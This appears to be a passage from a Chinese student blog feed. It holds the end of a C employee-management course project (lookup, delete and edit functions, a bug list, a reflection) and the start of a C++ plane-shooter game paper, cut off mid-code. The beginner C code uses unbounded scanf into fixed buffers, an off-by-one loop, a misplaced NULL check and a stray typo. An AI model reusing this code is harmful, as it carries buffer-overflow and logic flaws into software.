关于筛选其实可以做的更好，比如说以年龄方式筛选的时候可以让使用者自己输入筛选的年龄范围，而不是我自己预先设定好的青年，壮年。同样按工资进行查询时同样也可以让使用者设置自己的筛选范围，这样可能对使用者更加友好。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3 第三点我曾经试图做出复合的筛选程序，只是感觉会过于复杂就没有做，大体的思路和现在一样，但是同时选择多种筛选方式，并对二进制文件中的数据进行复合筛选，找到需要的数据。</p><h5 id="3-2-7查找职工信息："><a href="#3-2-7查找职工信息：" class="headerlink" title="3.2.7查找职工信息："></a>3.2.7查找职工信息：</h5><pre class="line-numbers language-none"><code class="language-none">void f_3_1(struct workers *n)&#x2F;&#x2F;以员工号方式查询某个员工的信息。&#123;    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);a    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的职工号：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].jobNo,found)&#x3D;&#x3D;0)        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;void f_3(struct workers *n)&#x2F;&#x2F;以员工号方式查询某个员工的信息。&#123;    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的职工号：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].jobNo,found)&#x3D;&#x3D;0)        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);&#125;void f_3_2(struct workers *n)&#123;    &#x2F;&#x2F;以姓名方式查找员工；    system(&quot;cls&quot;);    struct workers read[100],*p;    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),100,fp);    char found[100];    fclose(fp);    printf(&quot;\n请输入你要查询的职工的姓名：&quot;);    scanf(&quot;%s&quot;, found);    int i;    for (i&#x3D;0; i&lt;100; i++)    &#123;        p&#x3D;&amp;read[i];        if(strcmp(read[i].name,found)&#x3D;&#x3D;0)            &#x2F;&#x2F;用found数组进行比较如果found数组和name相同则执行；        &#123;            printf(&quot;——————————————————————————————\n&quot;);            printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);            printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);            printf(&quot;—————————————————————————————\n&quot;);            break;        &#125;    &#125;    if (i&#x3D;&#x3D;100)        &#x2F;&#x2F;当    &#123;        printf(&quot;没有该员工！&quot;);    &#125;    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块对员工信息的查询功能包括两个方面，按员工号对员工信息进行查询和按照姓名方式进行查询，如果查询失败则输出没有该员工，返回操作页面。反之查询成功，输出查询到的数据。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 这一块代码主要利用<strong>strcmp（）函数</strong>比较输入的员工号或者员工姓名与从二进制文件中读取到结构体块中的数据对比，如果strcmp返回值为0则查询成功。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 这部分代码也有改进的地方由于各种原因没有实现。</p><h5 id="3-2-8删除员工信息"><a href="#3-2-8删除员工信息" class="headerlink" title="3.2.8删除员工信息"></a>3.2.8删除员工信息</h5><pre class="line-numbers language-none"><code class="language-none">int f_4(struct workers *workers)&#x2F;&#x2F;删除数据；&#123;    struct workers *p;    int j;    struct workers read[100];    char find[10];    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),NUM,fp);    printf(&quot;请输入要删除的职工号&quot;);    scanf(&quot;%s&quot;,find);    for(j&#x3D;0; j&lt;&#x3D;NUM; j++)    &#123;        if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)        &#123;            NUM--;            &#x2F;&#x2F;将num--这个操作，更改变量的大小，方便再次存入。            break;        &#125;    &#125;    if(NUM&lt;j)        &#x2F;&#x2F;如果没有提前结束，j的最终大小回是num+1;判断num是否及时结束。    &#123;        printf(&quot;该职工号不存在！&quot;);        system(&quot;pause&quot;);    &#125;    if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)    &#123;        for(j; j&lt;NUM; j++)        &#123;            strcpy(read[j].jobNo,read[j+1].jobNo);            strcpy(read[j].name,read[j+1].name);            strcpy(read[j].sex,read[j+1].sex);            strcpy(read[j].position,read[j+1].position);            strcpy(read[j].year,read[j+1].year);            strcpy(read[j].salary,read[j+1].salary);            strcpy(read[j].addr,read[j+1].addr);            strcpy(read[j].tel,read[j+1].tel);        &#125;    &#125;&#x2F;&#x2F;将read[j]进行移位，达到删除的目的；    fclose(fp);&#x2F;&#x2F;关闭文件    char ch[10];    &#x2F;&#x2F;定义一个    fp&#x3D;fopen(&quot;text.dat&quot;,&quot;wb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;删除失败！&quot;);        exit(EXIT_FAILURE);    &#125;    fwrite(read,sizeof(struct workers),NUM,fp);    fclose(fp);    FILE *fp1;    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;w+&quot;);    &#x2F;&#x2F;使用一个txt格式的文件作为辅助，进行数据量的计数。    itoa(NUM,ch, 10);    &#x2F;&#x2F;一个没学过的函数，把整形数转化成字符型；    fputs(ch,fp1);    fclose(fp1);    system(&quot;cls&quot;);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从二进制文件中将数据全部读取出来，将输入的员工号与已有数据中的员工号进行比对，当数据相同时删除该员工信息，并将全部信息重新写入文件中。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 这一块程序是我做出来感觉遗憾最大的一块，在C语言实训最后的答辩中，我看到很多同学在删除这一块下足了功夫，我看到有的同学在删除前增加了是否删除的验证程序，也有的同学在这一块追加了密码输入，以验证执行删除功能的是否是管理员本人。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 如果有时间，可以尝试增加一个撤销删除的功能，这个功能之前想过，可以令设一个结构体变量暂时存储删除的数据，如果执行撤销删除程序是，则把暂存结构体中的数据写入二进制文件中。<br>#####3.2.9修改员工信息</p><pre class="line-numbers language-none"><code class="language-none">void f_5(struct workers *workers)&#x2F;&#x2F;在文件中读取数据，对数据进行修改，最后在存入文件中。&#123;    struct workers *p;    int j;    struct workers read[NUM];    char find[10];    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),NUM,fp);    printf(&quot;请输入要修改的职工号&quot;);    scanf(&quot;%s&quot;,find);    system(&quot;cls&quot;);    for(j&#x3D;0; j&lt;NUM; j++)    &#123;        if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)        &#123;            printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   1.修改员工号                   2.修改姓名             ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   3.修改性别                     4.修改担任职务         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   5.修改年龄                     6.修改员工工资         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   7.修改员工家庭住址             8.修改员工联系方式     ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);            p &#x3D; (struct workers *)malloc(sizeof(struct workers));            p&#x3D;workers;            int n;            scanf(&quot;%d&quot;,&amp;n);            switch (n)            &#123;            case 1:                printf(&quot;请输入员工号:&quot;);                scanf(&quot;%s&quot;, read[j].jobNo);                break;            case 2:                printf(&quot;请输入姓名:&quot;);                scanf(&quot;%s&quot;,read[j].name);                break;            case 3:                printf(&quot;请输入性别:&quot;);                scanf(&quot;%s&quot;, read[j].sex);                break;            case 4:                printf(&quot;请输入所担任职务:&quot;);                scanf(&quot;%s&quot;, read[j].position);                break;            case 5:                printf(&quot;请输入年龄：&quot;);                scanf(&quot;%s&quot;,read[j].year);                break;            case 6:                printf(&quot;请输入工资:&quot;);                scanf(&quot;%s&quot;,read[j].salary);                break;            case 7:                printf(&quot;请输入家庭住址：&quot;);                scanf(&quot;%s&quot;,read[j].addr);                break;            case 8:                printf(&quot;请输入员工联系方式：&quot;);                scanf(&quot;%s&quot;,read[j].tel);                break;            &#125;        &#125;    &#125;&#x2F;&#x2F;以全部重新输入的形式去替换原本数据，达到修改的目的；    fclose(fp);    fp&#x3D;fopen(&quot;text.dat&quot;,&quot;wb+&quot;);    fwrite(read,sizeof(struct workers),NUM,fp);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件修改失败&quot;);        exit(EXIT_FAILURE);    &#125;    printf(&quot;修改成功！&quot;);    fclose(fp);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#x2F;&#x2F;最后返回操作界面；&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块具体执行数据的修改，分成八个部分修改员工的各种信息。</p><h5 id="3-2-10退出程序"><a href="#3-2-10退出程序" class="headerlink" title="3.2.10退出程序"></a>3.2.10退出程序</h5><pre class="line-numbers language-none"><code class="language-none">int f_6(char n)&#x2F;&#x2F;退出程序；&#123;    printf(&quot;感谢您使用本系统，祝您工作愉快\n&quot;);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-漏洞分析与修复"><a href="#4-漏洞分析与修复" class="headerlink" title="4.漏洞分析与修复"></a>4.漏洞分析与修复</h2><p>在整个C语言实训中，我不断的制造大大小小的bug，同时也在不断的修复这些bug，以下是我在这个C语言实训中遇到的一些问题。<br>1.起初我对删除文件信息的设计存在无法修复的缺陷，起初的设想是用空格字符串去换结构体数组中的每一项字符串，但做出来，再次浏览时发现位置被空格字符串占据，尝试修改这个被空格占据的结构体，发现无法继续对该位置进行操作，最终决定放弃该思路。<br>2.在浏览全部数据时难以判断存入数据多少；在老师的指导下采用了一个txt文件作为辅助，这一点极其关键，我的这串代码如果缺少了作为辅助的文本文件data.txt实际上是无法运行的，但同时我的程序中也没有代码块，包含对该辅助文件的创建，只有对改文件进行更新，意味着使用改系统，必须手动创建一个文本文件data.txt<br>3.文本文件的读写，将文本文件的信息读入程序时发现存在问题，在文本文件中是以字符型的一个个数字，而在程序中使用我需要的是一个整形数，最后百度找到了一个函数atoi就这个将字符型数转化成整形<br>4.同上一个问题在写入时也有这个问题，然后就找到了一个函数将int类型转化成char数组。<br>5.在添加员工的过程中，一开始使用了wb+却没注意到，发现数据一直存不进去。之后看到打开方式，改成ab+就没问题了。<br>6.在员工登录，执行完查询程序后，意外弹出了管理员的页面，检查程序发现是起初按管理员模式写的操作页面被镶嵌到每一个功能块的最后，而员工直接调用管理员的查询函数照成了该故障，故重写了一个更改过的查询函数，用在员工页面。<br>7.在使用工程解决的时候因为对文件引用不太了解出现了一堆问题，修复了半天。<br>8.其实在查询的时候那个格式真的很难弄，一开始的思路存在问题，起初是根据第一个存入的数据大小更改页面的大小，但是发现只要输入的数据发生改变，就会导致格式不在规范，最后则是由%nd的形式规范</p><h2 id="5-总结反思"><a href="#5-总结反思" class="headerlink" title="5.总结反思"></a>5.总结反思</h2><p>由于我们的C语言的实训，由于开课比较早，专业课没有结束，做项目需要的结构体的知识和文件调用的知识并没有学，最初做起来也是非常困难，利用互联网去查询如何实现文件调用，去看网络上其他人做到程序，通过种种方式去学习这些内容，对我们组每一位组员的自我学习能力都是一个巨大的提高。<br>另一个体会是规划的重要性，我们一开始程序设计分析的时候对规划做得并不好，很多程序功能都是后面有了构思后补充的，如果会进行下一次的实训，系统的构思一定要做好。<br>    生活中我们习以为常的小问题，我们看似毫无新意的小程序，由我们自己实施起来却困难重重，大家都喜欢开程序员的玩笑，说,你怎么还不秃顶。看似调侃却透露出编程的不易，而属于我们的一切才刚刚开始，实训当然是挺难的，没有接触的函数，细小的失误，复杂的逻辑，但所幸我们成功地站在了这里。我们从中吸取了许多教训，我们对以后的学习和生活有了更多的了解。</p><blockquote><p>这是最好的时代，这是最坏的时代，我们仍然年轻，我们仍然伫立。——–致所有在座的各位。</p></blockquote><h2 id="6收获"><a href="#6收获" class="headerlink" title="6收获"></a>6收获</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实训真的带给我们很多提高，使用的很多函数都是课上没有讲过的，而这里调了一些展示出来</p><blockquote><p>system(“pause”);暂停函数，避免程序运行跳转太快而无法看清数据。<br>system(“cls”);清屏函数，清楚屏幕上的信息，方便程序展示。<br>atoi（）函数将char类型数转化为int类型的数。<br>itoa（）函数将int类型的变量转化为字符串。<br>Sleep（）函数来自Windows.h中的函数，让程序延迟一段时间，登录系统的动画就是应用了该函数<br>fflush(stdin)函数，清空缓冲器，方便后续的文件读写</p></blockquote><p>在其他的方面，如小组合作，自我学习能力，从网络上获取知识的能力都得到显著的提高。</p><h2 id="7-程序演示"><a href="#7-程序演示" class="headerlink" title="7.程序演示"></a>7.程序演示</h2><h2 id="8-鸣谢"><a href="#8-鸣谢" class="headerlink" title="8.鸣谢"></a>8.鸣谢</h2><p>感谢我们大一的C语言黄老师，及负责我们C语言实训的任老师，及协助我完成实训工作的两位同组同学。</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 课程论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程论文：基于C++的可视化飞机大战游戏</title>
      <link href="/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98%E6%B8%B8%E6%88%8F/"/>
      <url>/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<hr><p>摘要： 飞机大战是一款经典的游戏，最早应追溯到打击者1945（Strikers 1945），这是日本彩京公司于1995年发售的飞行射击游戏。本作是参照打击者1945基于visual C++写成的飞行射击类游戏。本作中实现了敌机的产生功能、子弹的发射功能、飞机中弹销毁和计算得分等功能,而且通过文件读写的相关操作完成了存档与读档的相关操作。本作通过便捷的操作方式，使玩家可以轻易地上手该游戏，在游戏中放松心情，释放压力，提高反应能力。游玩该游戏可以为玩家带来欢乐。</p><hr><p>关键词： 可视化 飞机大战 游戏设计</p><p>引言 随着社会的不断发展，人们的生活方式也不断的在变化，人们的娱乐方式也越发的多种多样。人们对美好生活的向往，不单单局限于物质生活，人们的精神生活也在一天天的丰富。游戏是很多人精神生活中的一种重要组成部分。毫无疑问飞机大战是一款极其经典的游戏，玩家通过鼠标或键盘操作飞机攻击敌方飞机，躲避碰撞和敌方飞机攻击。极其简单的操作和轻松的上手，使得这一款游戏带给了无数人欢乐。</p><h4 id="1-需求分析">1 需求分析</h4><p>在飞行射击类游戏中，玩家登陆游戏后可以通过鼠标或键盘操作飞机前进，躲避敌机攻击，并通过点击鼠标左键或空格键发射子弹击败敌机。</p><p>完成这个飞机大战游戏的设计，需要完成用户飞机的移动功能，敌机的产生功能、子弹的发射功能、飞机中弹销毁和计算得分等功能。在用户需要时可以暂停游戏，可以通过文件读写完成存档与读档。为丰富游戏的趣味性，相应增加了各种音效，并会根据用户的得分产生相应的敌机。</p><h4 id="2-关键技术">2 关键技术</h4><h5 id="2-1-c-面向对象的程序设计">2.1 C++面向对象的程序设计</h5><p>C++起始于C语言。当C语言发展到巅峰时出现了增加关键词和类的C with class的C语言版本，而这是C语言的一大突破，开发者将这一种语言命名为C++。这便是C++最早的版本。</p><blockquote><p>美国AT&amp;T贝尔实验室的本贾尼·斯特劳斯特鲁普博士在20世纪80年代初期成功地实现了C++，即C with classes。当时C++是作为C语言的加强版本出现，从给C增加类开始，不断增加新的特征<sup>[1]</sup>。</p></blockquote><p>然而就目前而言，C++可以认为它是一门独立的编程语言，它源于C语言但是它并不依赖于C语言。C++与C语言也是有本质差别：在于C++是面向对象的，而C语言是面向过程的。或者说C++是在C语言的基础上增加了面向对象程序设计的新内容，是对C语言的一次更重要的改革，使得C++成为软件开发的重要工具。</p><h5 id="2-2-c-语言的优点">2.2 C++语言的优点</h5><ul><li>在C语言的基础上进行扩充和完善，使C++兼容了C语言的面向过程特点，又成为了一种面向对象的程序设计语言</li><li>可以使用抽象数据类型进行基于对象的编程</li><li>可以使用多继承、多态进行面向对象的编程</li><li>可以担负起以模版为特征的泛型化编程</li><li>C++实现了面向对象程序设计。在高级语言当中，处理运行速度是最快的，大部分的游戏软件，系统都是由C++来编写的</li><li>C++语言非常灵活，功能非常强大。如果说C语言的优点是指针，那么C++的优点就是性能和类层次结构的设计</li><li>C++非常严谨、精确和数理化，标准定义很细致</li><li>C++语言的语法思路层次分明、相呼应;语法结构是显式的、明确的</li></ul><h5 id="2-3-visual-c-的优点">2.3 Visual C++的优点</h5><p>（1）与Windows紧密结合，MFC类库集成了大量已经预先定义好的类，用户可以根据编程的需要定义相应的类，或根据需要自己定义相应的类。因此Visual C++在使用API等方面和Windows联系的最为紧密<sup>[</sup><sup>2]</sup>。</p><p>（2）强大的类库支持和类改造能力。代码重用是C++追求的目标，重用就是从已有的基类派生出新的C++类；MFC提供了大量的基类供程序员们根据不同的应用要求生成新的类以满足要求。VC++有了MFC，具有非常强大对类改造的能力。只要集成MFC类，稍加修改就可以得到符合要求的控件类或应用类。</p><p>（3）拥有高效的运行速度。高的运行速度取决于两点：1.软件本身编写的质量，2.编程工具的编译质量。因为VC++非常接近Windows底层，所以编译器所编译的质量相当高，从而保证了VC++编写出来的软件产品拥有高效的运行速度<sup>[</sup><sup>3]</sup>。</p><h5 id="2-4-c-的语言体系">2.4 C++的语言体系</h5><p>（1）C子语言。C++是以C语言为基础，C++几乎支持C语言的全部功能。</p><p>（2）面向对象的C++。C++首先是一门面向对象的程序设计语言，并以此闻名。</p><p>（3） 泛型编程语言。相比C语言，C++增加了模板，C++强大的模板功能使系统能够在编译期间就能完成许多工作，从而大大提高了运行效率<sup>[</sup><sup>4]</sup>。</p><p>（4）STL。随着STL的不断发展，渐渐成为C++程序设计体系中不可或缺的一部分。其安全性与规范性的优秀使得它受到程序员的欢迎<sup>[</sup><sup>1]</sup>。</p><h4 id="3-游戏总体设计">3.游戏总体设计</h4><p>游戏被分成两个部分，一部分是与用户输入有关的更新，包括根据鼠标位置或键盘按键进行飞机的移动和炮弹发射等等。另一部分是与用户输入无关的更新，包括子弹移动，敌机移动逻辑等判断。图1为飞机大战程序设计图。</p><img src=".\基于C++的可视化飞机大战游戏\飞机大战程序设计图.png" style="zoom:50%;" /><center>图1 飞机大战程序设计图</center>#### 4 游戏功能实现<h5 id="4-1-代码设计">4.1 代码设计</h5><p>4.1.1 头文件</p><ol><li>#include<iostream>头文件，包含头文件输入输出流，c++中没有c语言中输入输出语句，而是利用数据流来解决这个问题。要使用比如cout,cin语句输入输出函数。其中#include文件的目的是把多个编译单元公用的内容单独放在一个文件里减少整体代码尺寸，或者提供可跨工程使用的公共代码；</li><li>#include <fstream>头文件#include 是C++的预编译语句，作用是包含对应的文件，在这里是包含C++的STL头文件fstream。在包含了这个文件后，就可以使用fstream中定义的类及各种成员函数了。fstream是C++ STL中对文件操作的合集，包含了常用的所有文件操作。在C++中，所有的文件操作，都是以流(stream)的方式进行的，fstream也就是文件流file stream<sup>[</sup><sup>5]</sup>。</li><li>#include<iomanip>头文件,这个头文件是声明一些 “流操作符”的，比较常用的setw(int);//设置显示宽度、left//right//设置左右对齐、setprecision(int);//设置浮点数的精确度。</li><li>#include<fstream>包含读写文件头文件，实际上是一个输出流的类模板，含有ifstream和ofstream两个派生类。</li><li>#include &lt;math.h&gt; 是包含math头文件的意思，math.h头文件中声明了常用的一些数学运算，比如乘方，开方运算等等。</li><li>#include&lt;graphics.h&gt;头文件是C语言和visual studio的图形库文件，包含像素函数、线型函数、画线函数、相对画线函数等多种函数，可进行图形的快速编程。这也是实现可视化的最重要工具。使用easyx.exe，可以直接运行安装图形库到visual studio。然后直接使用</li><li>#include&lt;windows.h&gt;头文件是最重要的头文件之一，它包含了其他Windows头文件，这些头文件也包含了其他头文件，其中有用户界面函数&lt;Winuser.h&gt;、图形设备接口函数&lt;Wingdi.h&gt;<sup>[</sup><sup>6]</sup></li><li>#include&lt;conio.h&gt;是Console Input/Output（控制台输入输出）的简写，其中定义了通过控制台进行数据输入和数据输出的函数，主要是一些用户通过按键盘产生的对应操作，比如getch()函数等等<sup>[</sup><sup>4]</sup></li><li>#pragma comment(lib,“Winmm.lib”)声明程序使用了winmm.lib库，这个库是是Windows多媒体相关应用程序接口，用于低档的音频和游戏手柄。可以用来实现音频的添加和利用。在该飞机大战程序中这个库中的内容实现了游戏运行时中的背景音乐的开始和结束放映等功能</li></ol><p>4.1.2使用函数</p><ul><li>settextstyle() 设置文本型式函数，函数settextstyle() 设置图形文本当前字体、文本显示方向（水平显示或垂直显示）以及字符大小。在使用中用于显示得分和成绩。通常与Outtextxy配套使用。</li><li>Outtextxy()函数，这个函数用于在指定位置输出字符串</li><li>loadimageLoadImage()函数，功能是装载图标，光标，或位图。在本程序中用于加载图片</li><li>Initgraph()函数功能为初始化图形系统。pathtodriver表示存放图形驱动文件的路径</li><li>SetTextColor()，Windows API 函数，设置指定DC中的文字颜色</li><li>kbhit()是一个C和C++函数，用于非阻塞地响应键盘输入事件。其中文可译为“键盘敲击”(keyboard hit)，注意这个函数在高版本VC下已被淘汰，应使用_kbhit()函数</li><li>MouseHit()函数是实现鼠标操作最关键的函数，用于判断是否有鼠标信息。<sup>[</sup><sup>5]</sup>使用MouseHit()函数效果与kbhit()函数效果类似，如果没有鼠标信息自动跳过。避免了因为没有鼠标信息导致程序无法运行的状况<sup>[7]</sup></li><li>getch()是编程中所用的函数，这个函数是一个不回显函数，当用户按下某个字符时，函数自动读取，无需按回车，有的C语言命令行程序会用到此函数做游戏，但是这个函数并非标准函数。在高版本VC或者VS中已经无法使用应该使用_getch()函数<sup>[8]</sup></li><li>SetBkMode()函数这就需要使用SetBkMode函数来设置DrawText函数的输出方式，显示设备共有两种输出方式：OPAQUE和TRANSPARENT。OPAQUE的方式是用当前背景的画刷的颜色输出显示文字的背景，而TRANSPARENT是使用透明的输出，也就是文字的背景是不改变的。</li><li>MCI (Media Control Interface，媒体控制接口) 函数中，有些只适用于一种接口方式，有些则两种接口都可以用。mciSendString只适用于命令串接口方式（命令串中不区分大小写）以形如mciSendString(“play movie”,buf,sizeof(buf),NULL);的方式进行音频播放，以形如mciSendString(“pause movie”,buf,sizeof(buf),NULL);的方式暂停播放。以形如mciSendString(“close movie”,buf,sizeof(buf),NULL)的形式关闭播放。</li></ul><h5 id="4-2操作逻辑">4.2操作逻辑</h5><p>本程序使用两种操作方式，依靠键盘按键操作和依靠鼠标位置进行操作。图2为飞机移动操作逻辑示意图。</p><img src=".\基于C++的可视化飞机大战游戏\飞机移动操作逻辑示意图.png" style="zoom:80%;" /><center>图2 飞机移动操作逻辑示意图</center>使用鼠标操作代码如下：<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (isExpolde 